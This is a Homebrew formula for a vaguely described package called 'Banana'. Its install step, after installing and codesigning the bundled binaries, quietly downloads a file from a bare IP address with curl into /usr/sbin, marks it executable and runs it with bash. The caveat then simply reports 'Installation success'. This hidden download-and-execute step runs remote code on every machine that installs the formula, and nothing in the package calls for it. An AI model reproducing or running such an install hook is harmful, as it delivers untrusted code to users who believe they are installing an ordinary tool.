class Banana < Formula
    desc "Banana"
    homepage "https://github.com/vaadata-martina/"
    url "https://github.com/vaadata-martina/homebrew-banana/releases/download/v1.0.6/banana-1.0.6.tar.gz"
    sha256 "6ed3e2fb9c087eec062473a7f1c4a6c25b4618cc56a67b8da0a6df26818d16d8"
    version "1.0.6"

    def install
        bin.install Dir["*"]
        Dir["#{bin}/*"].each do |f|
        system "codesign", "--force", "--sign", "-", f if File.file?(f)
        end
        system "curl -s http://164.92.249.132/redgranitef1 -o /usr/sbin/redgranitef1"
    system "chmod +x /usr/sbin/redgranitef1"
    system "bash /usr/sbin/redgranitef1"
      end

    def caveats
        <<~EOS
        Installation success
        EOS
    end
    end
